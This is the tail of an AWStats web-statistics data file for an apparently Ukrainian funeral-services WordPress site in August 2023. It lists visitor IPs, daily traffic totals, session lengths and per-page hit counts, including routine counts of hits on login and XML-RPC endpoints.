+62.80.168.226 14 76 1396791 20230806190017
+164.132.169.55 6 6 282182 20230826204032
+163.172.104.22 3 3 7678 20230817152138
+190.109.177.170 1 1 161319 20230820011600
+106.0.49.122 2 2 7415 20230831212313
+139.59.13.200 1 1 55905 20230809043838
+195.140.169.78 2 42 595843 20230817184552
+147.78.3.223 6 6 1464216 20230829192306
+200.147.58.30 1 1 493 20230823151335
+51.38.52.128 1 1 3661 20230813190022
+176.53.222.138 0 2 13566 
+143.110.177.0 1 1 3661 20230814025351
+31.131.2.30 6 6 1464295 20230829212306
+88.198.195.18 1 1 477 20230819182415
+91.221.199.72 10 192 2644502 20230829153653
+95.161.221.65 2 42 520202 20230805123942
+176.36.42.133 6 51 947869 20230803182633
+52.89.255.64 21 21 53746 20230818022611
+187.235.103.1 1 1 620 20230813023953
+91.197.7.231 27 77 1771376 20230826155808
+178.235.182.187 31 92 1404876 20230801165350
+88.155.109.27 4 35 446622 20230814084329
+77.111.244.65 2 35 247242 20230815222006
+185.50.25.24 1 1 620 20230825095633
+15.204.182.106 2 2 110718 20230815101532
+79.58.84.109 1 1 477 20230822084057
+138.121.114.14 1 1 620 20230813023748
+207.180.253.168 1 1 493 20230831142323
+176.122.118.197 19 84 1218944 20230809002502
+206.189.123.185 1 1 55906 20230805040204
+103.161.206.69 1 1 620 20230813023722
+65.109.155.233 1 1 249175 20230802075503
+46.211.75.144 2 30 650800 20230818153215
+195.133.88.24 6 6 1464235 20230830042308
+190.99.43.56 1 1 477 20230808030736
+195.238.116.75 2 25 215397 20230804144758
+31.134.73.167 19 66 1293141 20230830192220
+92.205.20.160 18 18 46068 20230818032505
+109.207.117.129 2 114 1437740 20230825193050
+146.70.119.167 1 1 55360 20230816144639
+148.66.134.3 2 2 7185 20230817192204
+68.195.141.123 13 67 788064 20230806200943
+37.187.252.187 6 6 15356 20230818022908
+94.25.187.45 4 40 388263 20230831212326
+186.167.66.98 1 1 620 20230819003743
+46.101.9.216 7 7 249229 20230829191138
+35.91.24.59 1 1 55863 20230803181353
+35.91.208.211 1 1 55882 20230803124605
+213.226.68.231 7 7 1713344 20230830002307
+178.133.169.173 15 60 1097479 20230811181130
+185.218.203.240 4 77 2375475 20230803141915
+176.125.47.46 2 71 860213 20230828104034
+208.91.69.17 1 1 244 20230812123218
+94.25.177.238 0 1 25813 
+39.110.218.101 1 1 55365 20230813143704
+46.211.84.164 2 87 5190083 20230829114706
+146.190.137.102 1 1 55895 20230803053954
+190.61.91.91 1 1 477 20230808030125
+185.39.207.35 4 4 978190 20230824211535
+65.109.155.162 24 24 4238945 20230823000553
+86.16.174.131 1 1 620 20230813024036
+39.101.207.82 6 6 15356 20230817202622
+69.4.87.74 2 2 486026 20230813162259
+195.3.134.135 0 1 28313 
+183.230.67.252 3 3 166087 20230831053933
+46.96.131.87 12 60 1557930 20230828183137
+38.62.221.208 1 1 32838 20230819180344
+45.64.227.124 1 1 620 20230819003824
+153.92.6.123 1 1 3661 20230809083256
+46.211.245.76 2 31 314196 20230804110115
+89.104.101.58 1 2 62174 20230814064130
+103.1.208.222 1 1 493 20230813021123
+62.116.165.86 1 1 3662 20230816134211
+27.115.124.101 1 11 141321 20230801100217
+107.180.103.21 3 3 7678 20230818031334
+31.43.16.19 2 80 1135687 20230808165747
+66.249.93.129 3 28 805038 20230828120438
+47.97.195.29 3 3 7678 20230817123048
+116.203.155.209 1 1 477 20230824004018
+176.31.120.153 12 12 30712 20230818043344
+194.149.137.230 1 1 477 20230821113552
+37.139.52.16 6 6 1464214 20230828062033
+179.43.174.229 7 7 1713361 20230831102557
+192.241.253.41 1 1 477 20230821183457
+188.191.239.248 4 67 971453 20230808143324
+181.36.167.242 1 1 620 20230813023918
+62.141.44.236 1 1 55371 20230824014940
+185.87.149.184 6 6 1470395 20230825231741
+91.238.164.172 1 1 3693 20230808202812
+46.161.14.84 7 7 78141 20230831222008
+144.126.213.107 1 1 477 20230818235438
+176.53.222.249 0 2 13566 
+87.236.176.198 1 1 55391 20230814015440
+181.192.119.154 1 1 55361 20230812060125
+195.182.0.8 2 59 1245023 20230829180903
+54.37.21.112 1 1 477 20230819183834
+194.44.41.129 7 62 1636577 20230828123549
+194.106.196.63 3 3 491972 20230822223552
+194.0.91.184 6 43 1412722 20230804190326
+5.62.20.36 6 53 794374 20230805204028
+162.0.229.76 3 3 59775 20230814201515
+185.251.38.59 6 6 1470338 20230827001807
+70.50.173.9 1 1 249216 20230802041433
+89.209.88.32 5 48 764427 20230821125636
+54.190.56.191 1 1 55863 20230803181419
+144.91.106.14 4 4 223576 20230806195954
+161.35.54.99 18 18 46068 20230818073422
+157.245.202.8 1 1 3709 20230824165858
+93.74.53.177 22 82 2198626 20230808173310
+78.101.94.161 1 1 620 20230813024023
+130.180.75.42 1 1 3693 20230808213019
+194.44.201.150 0 1 7031 
+176.36.233.187 9 55 911593 20230813170721
+5.45.86.124 6 6 1464325 20230829172058
+178.254.29.124 1 1 55349 20230831023213
+46.211.231.37 4 52 987875 20230819095749
+END_VISITOR
+
+# Date - Pages - Hits - Bandwidth - Visits
+BEGIN_DAY 31
+20230801 233 1173 36057938 67
+20230802 181 938 22264669 52
+20230803 160 859 29946645 64
+20230804 166 849 23023582 63
+20230805 137 759 17026111 66
+20230806 169 757 21741185 60
+20230807 244 985 32428254 76
+20230808 231 785 18848465 138
+20230809 226 924 21556909 99
+20230810 219 1279 31413194 63
+20230811 192 833 21503961 62
+20230812 177 510 20272197 63
+20230813 251 817 20942157 155
+20230814 176 942 30755768 94
+20230815 1217 1940 33090786 76
+20230816 258 1013 28348036 85
+20230817 870 1310 21121450 280
+20230818 646 1282 24094488 215
+20230819 179 459 13380358 95
+20230820 119 525 17924980 62
+20230821 200 662 19714059 70
+20230822 254 794 27470428 91
+20230823 176 394 18268950 91
+20230824 182 503 15715528 80
+20230825 146 694 18102936 68
+20230826 169 598 25646981 65
+20230827 166 465 17357677 67
+20230828 198 834 22669189 77
+20230829 1119 2046 47780132 89
+20230830 157 574 15060246 70
+20230831 163 378 13735788 94
+END_DAY
+
+# Session range - Number of visits
+BEGIN_SESSION 7
+15mn-30mn 33
+2mn-5mn 38
+30s-2mn 88
+0s-30s 2474
+5mn-15mn 44
+1h+ 29
+30mn-1h 91
+END_SESSION
+
+# URL - Pages - Bandwidth - Entry - Exit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_SIDER 182
+//xmlrpc.php 1872 1157341 3 3
+/ 1462 235690066 1270 1173
+/wp-login.php 1065 4039200 566 206
+/xmlrpc.php 704 365251 288 642
+/wp-content/themes/flatsome/assets/css/icons/fl-icons.woff2 363 2494988 10 161
+/organizator-pohoron/ 112 4665422 13 30
+/ritualnyj-agent/ 92 2670118 3 17
+/uslugi-kremacii/ 92 2804389 8 13
+/uk/truni/ 88 3393207 32 13
+/kontakty/ 87 3893915 25 51
+/uk/dezobrobka/ 31 1022326 8 1
+/ritualnye-kresty/ 79 2494619 26 15
+/uk/ritualni-poslugi/ 32 890032 3 3
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-43.jpg.webp 5 220390 0 0
+/wp-content/uploads/2021/07/IMG-0495.jpg.webp 2 165388 0 0
+/wp-content/themes/flatsome/assets/css/icons/fl-icons.ttf 2 12085 0 1
+/wp-content/uploads/2021/07/IMG-0647.jpg.webp 2 66120 0 0
+/groby/ 81 3324505 33 13
+/wp-content/uploads/2021/07/IMG-0485-225x300.jpg.webp 3 55434 0 0
+/uk/portret-na-pohoron/ 35 1141033 7 2
+//wp-json/wp/v2/users/ 11 10397 0 8
+/wp-content/uploads/2021/07/IMG-0502-224x300.jpg.webp 3 41094 0 0
+/wp-content/uploads/2021/07/IMG-0644.jpg.webp 2 119708 0 0
+/wp-admin/admin-post.php 2 832 0 1
+/wp-json/oembed/1.0/embed 1 1763 0 1
+/uk/ritualni-hresti/ 1 33769 0 1
+/uk/pominalni-obidi/ 49 1408768 13 6
+/wp-content/uploads/2021/07/IMG-0497-224x300.jpg.webp 3 35076 0 0
+/wp-content/themes/flatsome/assets/css/icons/fl-icons.woff 2 1466 0 1
+/uk/vidspivuvannya-pomerlogo/ 1 32631 0 0
+/uk/ 80 3552882 42 21
+/iskusstvennye-venki/ 38 1469347 6 7
+/ceny/ 55 1868063 5 13
+/uk/poslugi-kremacii/ 1 32833 0 0
+/uk/ritualni-tovari/ 86 2486408 44 12
+/uk/shtuchni-vinki/ 42 1394219 22 11
+/portret-na-pohorony/ 33 1211968 11 9
+/wp-content/uploads/2021/07/IMG-0484.jpg.webp 2 81508 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-33.jpg.webp 4 183632 0 0
+/medicinskoe-soprovozhdenie-pohoron/ 64 1955781 1 14
+/pohoronnyj-nabor/ 34 1305334 5 6
+/vedushhij-na-pohorony/ 35 1237686 3 23
+/wp-content/index.php 6 1464 3 3
+/wp-comments-post.php 1 337 1 1
+/uk/ritualni-pamyatniki/ 40 1288376 10 5
+/wp-content/ 2 488 2 2
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-06-171x300.jpg.webp 5 55780 0 0
+/wp-includes/wlwmanifest.xml 1 822 1 1
+/uk/o-kompanii/ 39 1147119 18 8
+/ritualnye-kresty 3 102467 0 1
+/uk/perevezennya-pomerlih/ 49 1574023 1 9
+/wp-content/uploads/2021/07/IMG-0647-197x300.jpg.webp 3 24186 0 0
+/uk/oformlennya-dokumentiv-dlya-pohoronu/ 38 1247117 11 7
+/wp-content/uploads/2021/07/IMG-0494.jpg.webp 2 142616 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-19.jpg.webp 5 137570 0 0
+/ritualnyj-zal/ 70 2262716 4 20
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-37-144x300.jpg.webp 5 39860 0 0
+/wp-content/uploads/2021/07/IMG-0067.png.webp 2 85928 0 0
+/uslugi-morga/ 70 2208836 2 19
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-40-128x300.jpg.webp 5 35860 0 0
+/.well-known/acme-challenge/lR3VhI0_9c0R2r0bOr2mO6NFRNmlr1y0Vn3L9W8Fqjo 2 600 2 2
+/uk/cini/ 48 1502920 0 8
+/ritualnye-uslugi/ 42 1226914 0 13
+/ritualnyj-transport/ 87 3052892 25 9
+/wp-content/uploads/2021/07/IMG-0487.jpg.webp 2 122588 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-25-159x300.jpg.webp 5 42260 0 0
+/search/members/ 1 17093 1 0
+/feed/atom/ 1 884 0 0
+/wp-content/plugins/index.php 8 1952 0 0
+/wp-content/uploads/2021/07/IMG-0494-224x300.jpg.webp 3 42078 0 0
+/feed/ 2 2028 0 2
+/uk/ritualni-hresti/ 50 1700398 8 9
+/muzykalnoe-soprovozhdenie-pohoron/ 64 2161583 20 7
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-33-122x300.jpg.webp 5 41920 0 0
+/uk/pohoronnij-nabir/ 37 1247835 7 2
+/wp-content/uploads/2021/07/IMG-0498.jpg.webp 2 111592 0 0
+/wp-content/uploads/2021/07/IMG-0646-198x300.jpg.webp 3 34380 0 0
+/wp-content/uploads/2021/07/IMG-0651.jpg.webp 2 95796 0 1
+/uk/organizator-pohoronu/ 45 1443260 5 7
+/ritualnye-tovary/ 41 1272225 14 7
+/wp-content/uploads/2021/07/IMG-0501-224x300.jpg.webp 3 40656 0 0
+/index.php 8 258553 5 6
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-40.jpg.webp 4 161184 0 0
+/wp-content/uploads/2021/07/IMG-0487-225x300.jpg.webp 3 43104 0 0
+/venki-na-pohorony/ 87 2671672 12 16
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-46.jpg.webp 5 181240 0 0
+/wp-content/uploads/2021/07/IMG-0037.png.webp 2 104628 0 0
+/wp-content/uploads/2021/07/IMG-0648-194x300.jpg.webp 3 29820 0 0
+/wp-content/uploads/2021/07/IMG-0495-224x300.jpg.webp 3 55518 0 0
+/wp-content/uploads/2021/07/IMG-0067-225x300.png.webp 3 31176 0 0
+/uk/ritualna-zala/ 41 1289784 3 3
+/wp-content/uploads/2021/07/IMG-0501.jpg.webp 2 126436 0 0
+/wp-content/uploads/2021/07/IMG-0041-225x300.png.webp 3 45282 0 0
+/wp-content/uploads/2021/07/IMG-0502.jpg.webp 2 128732 0 0
+/uk/poslugi-morgu/ 40 1315049 4 2
+/wp-content/uploads/2021/07/IMG-0648.jpg.webp 2 70488 0 0
+/uk/category/bez-kategorii/ 30 757472 9 0
+/wp-content/uploads/2021/07/IMG-0644-225x300.jpg.webp 3 46866 0 0
+/wp-content/uploads/2021/07/IMG-0483-225x300.jpg.webp 3 33918 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-06.jpg.webp 4 241776 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-28-121x300.jpg.webp 5 41680 0 0
+/wp-content/uploads/2021/07/IMG-0493.jpg.webp 2 130720 0 0
+/wp-content/uploads/2021/07/nosilshchiki-groba.png.webp 3 15312 0 0
+/venki-na-pohorony 1 33210 0 0
+/groby 8 536666 1 3
+/ritualnye-pamyatniki 1 32889 0 0
+/uk/organizator-pohoronu/ 1 32556 0 0
+/wp-content/uploads/2021/07/IMG-0500-224x300.jpg.webp 3 45768 0 0
+/uk/vidspivuvannya-pomerlogo/ 35 1115985 5 7
+/wp-content/uploads/2021/07/IMG-0651-204x300.jpg.webp 3 39234 0 1
+/wp-content/uploads/2021/07/IMG-0484-225x300.jpg.webp 3 26094 0 0
+/wp-content/uploads/2021/07/IMG-0496-224x300.jpg.webp 3 37554 0 0
+/uk/veduchij-na-pohoron/ 28 888771 2 2
+/wp-content/uploads/2021/07/IMG-0488-225x300.jpg.webp 3 37860 0 0
+/wp-content/uploads/2021/07/IMG-0499.jpg.webp 2 91784 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-56-146x300.jpg.webp 5 38030 0 0
+/wp-content/uploads/2021/07/IMG-0496.jpg.webp 2 102456 0 0
+/ritualnye-pamyatniki/ 47 1652229 20 10
+/wp-content/uploads/2021/07/IMG-0646.jpg.webp 2 85816 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-19-127x300.jpg.webp 5 34910 0 0
+/wp-content/uploads/2021/07/IMG-0485.jpg.webp 2 195540 0 0
+/wp-json 4 85371 0 2
+/wp-content/uploads/2021/07/IMG-0486-225x300.jpg.webp 3 45522 0 0
+/wp-content/uploads/2021/07/IMG-0041.png.webp 2 129500 0 0
+/otpevanie-umershego/ 81 2370162 13 13
+/wp-content/uploads/2021/07/Group-4vv5.png.webp 3 10914 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-25.jpg.webp 5 251940 0 1
+/wp-content/uploads/2021/07/IMG-0498-224x300.jpg.webp 3 30300 0 0
+/uk/muzichnij-suprovid-pohoronu/ 40 1497695 8 5
+/wp-content/uploads/2021/07/IMG-0486.jpg.webp 2 174672 0 0
+/uk/kontakti/ 46 1834468 3 15
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-56.jpg.webp 4 171256 0 0
+/uk/poslugi-kremacii/ 48 1487078 9 4
+/uk/ritualnij-agent/ 42 1385859 2 2
+/wp-content/uploads/2021/07/IMG-0488.jpg.webp 2 108460 0 0
+/uk/ritualnij-transport/ 1 32586 0 0
+/wp-content/uploads/2021/07/IMG-0497.jpg.webp 2 95848 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-53.jpg.webp 4 160768 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-22-142x300.jpg.webp 5 42460 0 0
+/wp-content/uploads/2021/07/IMG-0500.jpg.webp 2 135148 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-22.jpg.webp 6 253020 0 0
+/uk/medichnij-suprovid-pohoronu/ 43 1313232 4 1
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-53-135x300.jpg.webp 5 34370 0 0
+/perevozka-umershih/ 70 2103821 15 2
+/uk/ritualnij-transport/ 49 1508783 3 3
+/uk/vinki-na-pohoron/ 69 2232452 22 8
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-46-131x300.jpg.webp 5 32750 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-37.jpg.webp 4 186960 0 0
+/wp-admin/install.php 4 4375 3 4
+/nosilshhiki-groba/ 38 1383030 6 7
+/venok-iz-zhivyh-cvetov/ 51 1577908 14 8
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-43-142x300.jpg.webp 5 38720 0 0
+/wp-content/uploads/2021/07/Group-45.png.webp 3 14064 0 0
+/dezobrabotka/ 34 1122828 3 6
+/pominalnye-obedy/ 75 2333657 6 10
+/uk 5 1216838 0 0
+/.well-known/acme-challenge/zaEWYv_N8fWKtyIX9sv9BCwVKlLVtkpme5U93zTl9bU 3 900 3 3
+/wp-content/themes/flatsome/assets/css/icons/fl-icons.eot 3 12986 0 0
+/wp-content/uploads/2021/07/IMG-0068.png.webp 2 108020 0 0
+/wp-content/uploads/2021/07/IMG-0483.jpg.webp 2 103096 0 0
+/uk/nosii-truni/ 31 1022568 4 0
+/wp-json/wp/v2/users/1 6 4932 6 0
+/ritualnye-uslugi 4 83375 1 1
+/ritualnye-tovary 1 29612 0 1
+/oformlenie-dokumentov-dlya-pohoron/ 70 2236720 7 13
+/wp-content/uploads/2021/07/IMG-0068-225x300.png.webp 3 40608 0 0
+//wp-login.php 3 33170 0 1
+/wp-content/uploads/2021/07/Group-57.png.webp 13 86112 0 5
+/uk/pominalni-obidi/ 1 32530 0 0
+/o-kompanii/ 42 1354238 17 5
+/uk/truni/ 1 37198 0 0
+/wp-content/uploads/2021/07/IMG-0036.png.webp 2 100548 0 0
+/wp-content/uploads/2021/07/photo_2019-07-01_14-41-28.jpg.webp 4 184232 0 0
+/wp-content/plugins/ 5 1220 0 1
+/wp-content/uploads/2021/07/IMG-0036-225x300.png.webp 3 37092 0 0
+/uk/vinok-iz-zhivih-kvitiv/ 34 1154091 4 4
+/wp-content/uploads/2021/07/IMG-0037-225x300.png.webp 3 35454 0 0
+/wp-content/uploads/2021/07/IMG-0493-224x300.jpg.webp 3 40494 0 0
+/uk/medichnij-suprovid-pohoronu/ 1 31783 0 0
+/wp-content/uploads/2021/07/IMG-0499-224x300.jpg.webp 3 33348 0 0
+/wp-json/wp/v2/users/ 2 1718 0 0
+/account 2 33731 1 1
+END_SIDER
